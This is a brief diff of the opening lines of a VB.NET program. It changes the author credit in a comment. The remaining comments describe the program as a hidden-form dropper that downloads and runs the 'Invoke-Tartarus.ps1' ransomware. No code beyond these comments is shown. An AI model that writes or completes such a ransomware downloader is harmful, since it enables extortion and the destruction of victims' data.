@@ -1,5 +1,5 @@
 ﻿Public Class Form1
-    ' Coded by Bailey Dunlap
+    ' Coded by Weeke
     ' Deployment of Invoke-Tartarus.ps1 Ransomware using Download and Execute with VB.NET Hidden form application and CMD commands
     ' Created on 1/10/18
 
